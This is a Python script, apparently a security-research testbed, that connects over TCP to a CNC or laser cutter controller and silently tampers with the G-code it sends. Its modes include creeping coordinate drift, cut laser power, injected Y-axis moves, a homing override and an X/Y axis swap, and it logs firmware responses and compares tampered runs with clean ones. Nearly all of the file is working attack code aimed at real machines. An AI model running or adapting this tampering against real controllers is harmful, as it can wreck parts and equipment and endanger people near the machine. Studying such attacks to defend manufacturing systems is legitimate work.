#!/usr/bin/env python3
"""
Enhanced Attack Simulator with Configurable Parameters
Includes comparison runs and new attack modes
Save as: attack_simulator_advanced.py
Run as: python3 attack_simulator_advanced.py
"""

import socket
import time
import re
import json
import csv
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import List, Dict, Tuple, Optional
import threading

@dataclass
class CommandResult:
    timestamp: str
    command: str
    modified_command: str
    firmware_response: str
    latency_ms: float
    attack_type: str
    parameters: Dict

class AdvancedGCodeAttackSimulator:
    def __init__(self, cnc_ip="192.168.0.170", cnc_port=8080):
        self.cnc_ip = cnc_ip
        self.cnc_port = cnc_port
        self.sock = None
        self.command_history = []
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Attack parameters (configurable)
        self.attack_params = {
            'calibration_drift': {
                'enabled': False,
                'drift_rate': 0.5,
                'max_drift': 20.0,
                'current_drift': 0.0,
                'reset_period': 40
            },
            'power_reduction': {
                'enabled': False,
                'reduction_factor': 0.5
            },
            'y_injection': {
                'enabled': False,
                'injection_amount': -2.0,
                'injection_frequency': 1  # Every N commands
            },
            'home_override': {
                'enabled': False,
                'override_command': '$H'
            },
            'axis_swap': {
                'enabled': False,
                'swap_x_y': True
            }
        }
        
        # Statistics
        self.stats = {
            'total_commands': 0,
            'modified_commands': 0,
            'firmware_responses': {},
            'comparison_data': []
        }
        
        # Position tracking
        self.position_tracking = {
            'original': [],
            'modified': [],
            'comparison': []
        }
        
    def connect(self):
        """Connect to CNC and display initial response"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((self.cnc_ip, self.cnc_port))
            print(f"[+] Connected to CNC at {self.cnc_ip}:{self.cnc_port}")
            
            # Get initial greeting/status
            try:
                greeting = self.sock.recv(1024).decode('utf-8', errors='ignore').strip()
                if greeting:
                    print(f"[FIRMWARE] Initial response: {greeting}")
            except socket.timeout:
                pass
            
            # Get status
            response = self.send_command("?", show_response=True)
            return True
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return False
    
    def send_command(self, cmd, show_response=True):
        """Send command and always show firmware response"""
        if not self.sock:
            print("[!] Not connected")
            return None
            
        try:
            start_time = time.perf_counter()
            
            # Send command
            self.sock.send((cmd + "\n").encode())
            
            # Wait for and receive response
            self.sock.settimeout(1)
            response = ""
            try:
                while True:
                    chunk = self.sock.recv(1024).decode('utf-8', errors='ignore')
                    if not chunk:
                        break
                    response += chunk
                    if 'ok' in response or 'error' in response:
                        break
            except socket.timeout:
                if not response:
                    response = "[No response]"
            
            latency = (time.perf_counter() - start_time) * 1000
            
            # Always display command and response
            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"\n[{timestamp}] SENT: {cmd}")
            print(f"[{timestamp}] FIRMWARE: {response.strip()} ({latency:.2f}ms)")
            
            # Track statistics
            self.stats['total_commands'] += 1
            if response not in self.stats['firmware_responses']:
                self.stats['firmware_responses'][response.strip()] = 0
            self.stats['firmware_responses'][response.strip()] += 1
            
            self.command_history.append((cmd, response.strip(), latency))
            return response.strip()
            
        except Exception as e:
            print(f"[!] Send error: {e}")
            return None
    
    def configure_attack_parameters(self):
        """Interactive parameter configuration"""
        print("\n" + "="*60)
        print("ATTACK PARAMETER CONFIGURATION")
        print("="*60)
        
        # Calibration drift
        if input("\nConfigure calibration drift? (y/n): ").lower() == 'y':
            self.attack_params['calibration_drift']['enabled'] = True
            drift_rate = input(f"  Drift rate per command [{self.attack_params['calibration_drift']['drift_rate']}]: ").strip()
            if drift_rate:
                self.attack_params['calibration_drift']['drift_rate'] = float(drift_rate)
            max_drift = input(f"  Maximum drift [{self.attack_params['calibration_drift']['max_drift']}]: ").strip()
            if max_drift:
                self.attack_params['calibration_drift']['max_drift'] = float(max_drift)
            reset_period = input(f"  Reset after N commands [{self.attack_params['calibration_drift']['reset_period']}]: ").strip()
            if reset_period:
                self.attack_params['calibration_drift']['reset_period'] = int(reset_period)
        
        # Power reduction
        if input("\nConfigure power reduction? (y/n): ").lower() == 'y':
            self.attack_params['power_reduction']['enabled'] = True
            factor = input(f"  Reduction factor [{self.attack_params['power_reduction']['reduction_factor']}]: ").strip()
            if factor:
                self.attack_params['power_reduction']['reduction_factor'] = float(factor)
        
        # Y-axis injection
        if input("\nConfigure Y-axis injection? (y/n): ").lower() == 'y':
            self.attack_params['y_injection']['enabled'] = True
            amount = input(f"  Injection amount [{self.attack_params['y_injection']['injection_amount']}]: ").strip()
            if amount:
                self.attack_params['y_injection']['injection_amount'] = float(amount)
            freq = input(f"  Inject every N commands [{self.attack_params['y_injection']['injection_frequency']}]: ").strip()
            if freq:
                self.attack_params['y_injection']['injection_frequency'] = int(freq)
        
        # Home override attack
        if input("\nEnable $H (home) override attack? (y/n): ").lower() == 'y':
            self.attack_params['home_override']['enabled'] = True
            override = input(f"  Override command [{self.attack_params['home_override']['override_command']}]: ").strip()
            if override:
                self.attack_params['home_override']['override_command'] = override
        
        # Axis swap attack
        if input("\nEnable X/Y axis swap attack? (y/n): ").lower() == 'y':
            self.attack_params['axis_swap']['enabled'] = True
        
        print(f"\n[*] Attack configuration complete:")
        print(json.dumps(self.attack_params, indent=2))
    
    def apply_attacks(self, command):
        """Apply configured attacks to command"""
        original = command
        modified = command
        attack_log = []
        
        # Home override attack - replaces ALL commands with $H
        if self.attack_params['home_override']['enabled']:
            modified = self.attack_params['home_override']['override_command']
            attack_log.append(f"HOME_OVERRIDE: {original} -> {modified}")
            return modified, attack_log
        
        # Axis swap attack
        if self.attack_params['axis_swap']['enabled']:
            # Find all X and Y values
            x_match = re.search(r'X([\-\d.]+)', modified)
            y_match = re.search(r'Y([\-\d.]+)', modified)
            
            if x_match and y_match:
                x_val = x_match.group(1)
                y_val = y_match.group(1)
                # Swap X and Y
                modified = re.sub(r'X[\-\d.]+', f'X{y_val}', modified)
                modified = re.sub(r'Y[\-\d.]+', f'Y{x_val}', modified)
                attack_log.append(f"AXIS_SWAP: X{x_val},Y{y_val} -> X{y_val},Y{x_val}")
        
        # Calibration drift
        if self.attack_params['calibration_drift']['enabled']:
            drift_applied = False
            for axis in ['X', 'Y']:
                match = re.search(f'{axis}([\\-\\d.]+)', modified)
                if match:
                    original_val = float(match.group(1))
                    drift = self.attack_params['calibration_drift']['current_drift']
                    new_val = original_val + drift
                    modified = modified.replace(f'{axis}{original_val}', f'{axis}{new_val:.3f}')
                    drift_applied = True
            
            if drift_applied:
                attack_log.append(f"DRIFT: +{self.attack_params['calibration_drift']['current_drift']:.2f}mm")
                # Update drift
                self.attack_params['calibration_drift']['current_drift'] += self.attack_params['calibration_drift']['drift_rate']
                if self.attack_params['calibration_drift']['current_drift'] > self.attack_params['calibration_drift']['max_drift']:
                    self.attack_params['calibration_drift']['current_drift'] = 0
                    attack_log.append("DRIFT_RESET")
        
        # Power reduction
        if self.attack_params['power_reduction']['enabled']:
            power_match = re.search(r'S(\d+)', modified)
            if power_match:
                original_power = int(power_match.group(1))
                new_power = int(original_power * self.attack_params['power_reduction']['reduction_factor'])
                modified = modified.replace(f'S{original_power}', f'S{new_power}')
                attack_log.append(f"POWER: S{original_power} -> S{new_power}")
        
        # Y-axis injection
        if self.attack_params['y_injection']['enabled']:
            if self.stats['total_commands'] % self.attack_params['y_injection']['injection_frequency'] == 0:
                if 'G1' in modified or 'G0' in modified:
                    injection = f"; G1 Y{self.attack_params['y_injection']['injection_amount']} F500"
                    modified = modified + injection
                    attack_log.append(f"Y_INJECT: Added Y{self.attack_params['y_injection']['injection_amount']}")
        
        if modified != original:
            self.stats['modified_commands'] += 1
            print(f"\n[ATTACK] Applied: {', '.join(attack_log)}")
        
        return modified, attack_log
    
    def run_test_sequence(self, with_attacks=True):
        """Run a standard test sequence with optional attacks"""
        print(f"\n{'='*60}")
        print(f"RUNNING TEST SEQUENCE - Attacks: {'ENABLED' if with_attacks else 'DISABLED'}")
        print(f"{'='*60}")
        
        test_commands = [
            "G90",  # Absolute positioning
            "G1 F1500",  # Set feed rate
            "G1 X10 Y10",
            "G1 X30 Y10",
            "G1 X30 Y30", 
            "G1 X10 Y30",
            "G1 X10 Y10",
            "M3 S500",  # Laser on
            "G1 X20 Y20",
            "M5"  # Laser off
        ]
        
        results = []
        
        for cmd in test_commands:
            if with_attacks:
                modified_cmd, attack_log = self.apply_attacks(cmd)
            else:
                modified_cmd = cmd
                attack_log = []
            
            # Send command and get response
            response = self.send_command(modified_cmd)
            
            # Record result
            result = CommandResult(
                timestamp=datetime.now().isoformat(),
                command=cmd,
                modified_command=modified_cmd,
                firmware_response=response or "",
                latency_ms=self.command_history[-1][2] if self.command_history else 0,
                attack_type='|'.join(attack_log) if attack_log else 'none',
                parameters=self.attack_params.copy() if with_attacks else {}
            )
            results.append(result)
            
            time.sleep(0.3)  # Small delay between commands
        
        return results
    
    def run_comparison_test(self):
        """Run test sequence with attacks, then move to X100 and run without attacks"""
        print("\n" + "="*60)
        print("COMPARISON TEST - With and Without Attacks")
        print("="*60)
        
        # Run with attacks
        print("\n[PHASE 1] Running with attacks enabled...")
        attack_results = self.run_test_sequence(with_attacks=True)
        
        # Move to safe position
        print("\n[INTERLUDE] Moving to X100 for comparison run...")
        self.send_command("G0 X100")
        time.sleep(1)
        
        # Reset attack state
        self.attack_params['calibration_drift']['current_drift'] = 0
        
        # Run without attacks
        print("\n[PHASE 2] Running same sequence WITHOUT attacks...")
        normal_results = self.run_test_sequence(with_attacks=False)
        
        # Compare results
        print("\n" + "="*60)
        print("COMPARISON RESULTS")
        print("="*60)
        
        for i, (attack_res, normal_res) in enumerate(zip(attack_results, normal_results)):
            if attack_res.command != attack_res.modified_command:
                print(f"\nCommand {i+1}:")
                print(f"  Original: {attack_res.command}")
                print(f"  With Attack: {attack_res.modified_command}")
                print(f"  Attack Response: {attack_res.firmware_response}")
                print(f"  Normal Response: {normal_res.firmware_response}")
                print(f"  Latency diff: {attack_res.latency_ms - normal_res.latency_ms:.2f}ms")
        
        # Save comparison data
        self.stats['comparison_data'] = {
            'with_attacks': [asdict(r) for r in attack_results],
            'without_attacks': [asdict(r) for r in normal_results]
        }
        
        return attack_results, normal_results
    
    def export_data(self):
        """Export all data including firmware responses"""
        filename = f"attack_data_{self.session_id}.json"
        
        export_data = {
            'session_id': self.session_id,
            'cnc_target': f"{self.cnc_ip}:{self.cnc_port}",
            'attack_parameters': self.attack_params,
            'statistics': self.stats,
            'command_history': [
                {
                    'command': cmd,
                    'firmware_response': resp,
                    'latency_ms': lat
                }
                for cmd, resp, lat in self.command_history
            ],
            'comparison_data': self.stats.get('comparison_data', {})
        }
        
        with open(filename, 'w') as f:
            json.dump(export_data, f, indent=2)
        
        print(f"\n[+] Data exported to: {filename}")
        return filename
    
    def interactive_mode(self):
        """Interactive mode with parameter control"""
        print("\n[*] Interactive mode - Commands:")
        print("  config - Configure attack parameters")
        print("  test - Run test sequence with current settings")
        print("  compare - Run comparison test")
        print("  stats - Show statistics")
        print("  export - Export data")
        print("  quit - Exit")
        
        while True:
            try:
                cmd = input("\ngcode> ").strip()
                
                if cmd.lower() == 'quit':
                    break
                elif cmd.lower() == 'config':
                    self.configure_attack_parameters()
                elif cmd.lower() == 'test':
                    self.run_test_sequence(with_attacks=True)
                elif cmd.lower() == 'compare':
                    self.run_comparison_test()
                elif cmd.lower() == 'stats':
                    self.print_statistics()
                elif cmd.lower() == 'export':
                    self.export_data()
                elif cmd:
                    # Apply attacks if any are enabled
                    if any(p['enabled'] for p in self.attack_params.values()):
                        modified, _ = self.apply_attacks(cmd)
                        self.send_command(modified)
                    else:
                        self.send_command(cmd)
                        
            except KeyboardInterrupt:
                print("\n[*] Use 'quit' to exit")
            except Exception as e:
                print(f"[!] Error: {e}")
    
    def print_statistics(self):
        """Print current statistics including firmware responses"""
        print("\n" + "="*60)
        print("CURRENT STATISTICS")
        print("="*60)
        
        print(f"\nCommands:")
        print(f"  Total sent: {self.stats['total_commands']}")
        print(f"  Modified: {self.stats['modified_commands']}")
        if self.stats['total_commands'] > 0:
            mod_rate = (self.stats['modified_commands'] / self.stats['total_commands']) * 100
            print(f"  Modification rate: {mod_rate:.1f}%")
        
        print(f"\nFirmware Responses:")
        for response, count in self.stats['firmware_responses'].items():
            print(f"  '{response}': {count} times")
        
        print(f"\nActive Attacks:")
        for attack_name, params in self.attack_params.items():
            if params.get('enabled', False):
                print(f"  {attack_name}: {params}")

def main():
    print("="*60)
    print("Advanced G-Code Attack Simulator")
    print("With Configurable Parameters & Comparison Testing")
    print("="*60)
    print("\n⚠️  WARNING: This sends real commands to your CNC!")
    print("Ensure safety measures are in place!\n")
    
    simulator = AdvancedGCodeAttackSimulator()
    
    if not simulator.connect():
        print("[!] Failed to connect to CNC")
        return
    
    print("\nMain Menu:")
    print("1. Configure and run attacks")
    print("2. Run comparison test (with vs without attacks)")
    print("3. Interactive mode")
    print("4. Quick test all attack types")
    
    choice = input("\nSelect option [1]: ").strip() or "1"
    
    try:
        if choice == "1":
            simulator.configure_attack_parameters()
            simulator.run_test_sequence(with_attacks=True)
            
        elif choice == "2":
            simulator.configure_attack_parameters()
            simulator.run_comparison_test()
            
        elif choice == "3":
            simulator.interactive_mode()
            
        elif choice == "4":
            # Test each attack type
            print("\n[*] Testing all attack types...")
            
            # Test home override
            print("\n--- Testing $H Override Attack ---")
            simulator.attack_params['home_override']['enabled'] = True
            simulator.run_test_sequence(with_attacks=True)
            simulator.attack_params['home_override']['enabled'] = False
            
            time.sleep(2)
            
            # Test axis swap
            print("\n--- Testing X/Y Axis Swap Attack ---")
            simulator.attack_params['axis_swap']['enabled'] = True
            simulator.run_test_sequence(with_attacks=True)
            simulator.attack_params['axis_swap']['enabled'] = False
            
    finally:
        simulator.export_data()
        simulator.print_statistics()
        if simulator.sock:
            simulator.sock.close()
            print("\n[*] Connection closed")

if __name__ == "__main__":
    main()
